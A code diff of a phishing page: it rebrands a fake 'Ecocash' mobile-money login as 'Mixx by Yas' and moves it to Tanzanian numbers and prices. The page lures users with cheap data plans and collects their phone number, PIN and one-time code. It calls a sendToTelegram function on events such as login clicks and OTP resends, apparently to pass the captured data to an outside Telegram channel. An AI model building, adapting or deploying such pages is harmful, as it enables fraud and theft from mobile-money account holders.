@@ -4,13 +4,22 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Ecocash Login</title>
+<title>Mixx by Yas Login</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
 
 <style>
 
-*{box-sizing:border-box}
+*{
+box-sizing:border-box
+}
+
+:root{
+--primary:#0057b8;
+--primary-dark:#003f86;
+--primary-soft:#e8f2ff;
+--accent:#ffd400;
+}
 
 body{
 font-family:"Plus Jakarta Sans",system-ui;
@@ -19,23 +28,35 @@ min-height:100vh;
 display:flex;
 align-items:center;
 justify-content:center;
-background:linear-gradient(180deg,#e6f0ff,#cfe0ff);
+background:linear-gradient(180deg,#f7fbff,#dbeaff);
 overflow:hidden;
 }
+
+/* waves */
 
 .wave{
 position:fixed;
 width:700px;
 height:700px;
 border-radius:50%;
-background:radial-gradient(circle,rgba(0,58,143,.15),transparent 70%);
+background:
+radial-gradient(circle,
+rgba(0,87,184,.15),
+transparent 70%);
 filter:blur(45px);
 animation:float 20s infinite linear;
 z-index:-1;
 }
 
-.wave.one{top:-250px;right:-150px}
-.wave.two{bottom:-250px;left:-150px}
+.wave.one{
+top:-250px;
+right:-150px
+}
+
+.wave.two{
+bottom:-250px;
+left:-150px
+}
 
 @keyframes float{
 0%{transform:translateY(0)}
@@ -43,15 +64,19 @@ z-index:-1;
 100%{transform:translateY(0)}
 }
 
+/* card */
+
 .step{
 position:absolute;
 width:100%;
 max-width:420px;
 padding:30px;
 background:white;
-border-radius:22px;
-box-shadow:0 25px 50px rgba(0,0,0,.12);
+border-radius:24px;
+box-shadow:
+0 25px 50px rgba(0,87,184,.12);
 transition:.35s;
+border:1px solid rgba(0,87,184,.08);
 }
 
 .container{
@@ -68,17 +93,25 @@ transform:translateX(40px);
 }
 
 .logo{
-height:70px;
+height:72px;
 display:block;
 margin:auto;
 }
 
 h1{
 text-align:center;
-color:#003a8f;
-margin:12px 0 6px;
-font-size:22px;
+margin:14px 0 6px;
+font-size:24px;
 font-weight:800;
+
+background:linear-gradient(
+90deg,
+var(--primary),
+#0099ff
+);
+
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
 }
 
 .warning{
@@ -95,16 +128,24 @@ font-size:12px;
 margin-top:12px;
 display:block;
 color:#444;
+font-weight:600;
 }
 
 input{
 width:100%;
 padding:13px;
 border-radius:14px;
-border:1px solid #eee;
+border:1px solid #e5e7eb;
 background:#fafafa;
 margin-top:6px;
 font-size:14px;
+outline:none;
+transition:.2s;
+}
+
+input:focus{
+border-color:var(--primary);
+box-shadow:0 0 0 4px rgba(0,87,184,.08);
 }
 
 .phone-group{
@@ -114,12 +155,12 @@ align-items:center;
 }
 
 .prefix{
-background:#f1f5ff;
+background:rgba(255,212,0,.15);
 padding:13px;
 border-radius:14px;
-border:1px solid #eee;
-font-weight:600;
-color:#003a8f;
+border:1px solid rgba(255,212,0,.35);
+font-weight:700;
+color:var(--primary);
 }
 
 .btn{
@@ -129,10 +170,17 @@ padding:13px;
 border-radius:14px;
 border:0;
 font-weight:700;
-background:#003a8f;
+
+background:linear-gradient(
+135deg,
+var(--primary),
+#0072ef
+);
+
 color:white;
 cursor:pointer;
 opacity:.45;
+transition:.2s;
 }
 
 .btn.active{
@@ -147,12 +195,13 @@ margin:18px 0;
 }
 
 .pin input{
-width:52px;
-height:58px;
+width:58px;
+height:60px;
 font-size:22px;
 text-align:center;
 border-radius:16px;
-border:1px solid #eee;
+border:1px solid #e5e7eb;
+font-weight:700;
 }
 
 .count{
@@ -170,9 +219,9 @@ font-size:13px;
 .resend button{
 border:0;
 background:none;
-color:#003a8f;
+color:var(--primary);
 cursor:pointer;
-font-weight:600;
+font-weight:700;
 opacity:.4;
 }
 
@@ -191,16 +240,18 @@ opacity:1;
 
 <div class="container">
 
+<!-- LOGIN -->
+
 <div id="step1" class="step">
 
-<img src="assets/ecocash.png" class="logo">
+<img src="assets/logo.svg" class="logo">
 
 <h1>Login</h1>
 
 <label>Phone Number</label>
 
 <div class="phone-group">
-<div class="prefix">+263</div>
+<div class="prefix">+255</div>
 <input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX">
 </div>
 
@@ -221,16 +272,17 @@ Enter your 9-digit number starting with 7.
 
 </div>
 
+<!-- OTP -->
 
 <div id="step3" class="step hidden">
+
+<img src="assets/logo.svg" class="logo">
 
 <h1>OTP Verification</h1>
 
 <div class="warning" id="maskedNumber"></div>
 
 <div class="pin">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
@@ -249,8 +301,11 @@ Code expires in <span id="time">120</span>s
 
 </div>
 
+<!-- SUCCESS -->
 
 <div id="step4" class="step hidden">
+
+<img src="assets/logo.svg" class="logo">
 
 <h1>Success</h1>
 
@@ -261,8 +316,6 @@ Processing request...
 </div>
 
 </div>
-
-
 
 <script>
 
@@ -280,10 +333,10 @@ selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
 }catch(e){}
 
 const priceMap={
-"15GB":"USD 0.99",
-"35GB":"USD 1.99",
-"50GB":"USD 2.99",
-"Unlimited":"USD 3.99"
+"15GB":"TZS 999",
+"35GB":"TZS 1999",
+"50GB":"TZS 2999",
+"Unlimited":"TZS 3999"
 }
 
 function getPlanLine(){
@@ -346,14 +399,13 @@ device:device
 
 }
 
-
 /* phone cleanup */
 
 phone.oninput=e=>{
 
 let v=e.target.value.replace(/\D/g,"")
 
-if(v.startsWith("263")) v=v.slice(3)
+if(v.startsWith("255")) v=v.slice(3)
 if(v.startsWith("0")) v=v.slice(1)
 
 if(v[0]!=="7") v="7"+v.slice(1)
@@ -362,12 +414,11 @@ v=v.slice(0,9)
 
 e.target.value=v
 
-phoneValue="+263"+v
+phoneValue="+255"+v
 
 validateLogin()
 
 }
-
 
 /* PIN inputs */
 
@@ -400,7 +451,6 @@ validateLogin()
 
 })
 
-
 function validateLogin(){
 
 pinValue=[...pinInputs].map(i=>i.value).join("")
@@ -412,7 +462,6 @@ loginBtn.classList.remove("active")
 
 }
 
-
 function show(id){
 
 document.querySelectorAll(".step")
@@ -422,7 +471,6 @@ document.getElementById(id)
 .classList.remove("hidden")
 
 }
-
 
 /* login */
 
@@ -435,7 +483,7 @@ loginClicked=true
 
 sendToTelegram("login_clicked")
 
-const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
+const masked=phoneValue.replace(/(\+255\d{3})\d{4}(\d{2})/,"$1****$2")
 
 maskedNumber.innerHTML=`Enter the OTP sent to ${masked}`
 
@@ -444,7 +492,6 @@ show("step3")
 startTimer()
 
 }
-
 
 /* OTP inputs */
 
@@ -458,7 +505,7 @@ input.oninput=()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
-if(input.value && i<5) otpInputs[i+1].focus()
+if(input.value && i<3) otpInputs[i+1].focus()
 
 validateOtp()
 
@@ -479,18 +526,16 @@ validateOtp()
 
 })
 
-
 function validateOtp(){
 
 otpValue=[...otpInputs].map(i=>i.value).join("")
 
-if(otpValue.length===6)
+if(otpValue.length===4)
 otpBtn.classList.add("active")
 else
 otpBtn.classList.remove("active")
 
 }
-
 
 /* submit */
 
@@ -513,7 +558,6 @@ location.href="thankyou.html"
 
 }
 
-
 /* resend */
 
 resendBtn.onclick=()=>{
@@ -528,7 +572,6 @@ sendToTelegram("resend_otp")
 startTimer()
 
 }
-
 
 /* timer */
 
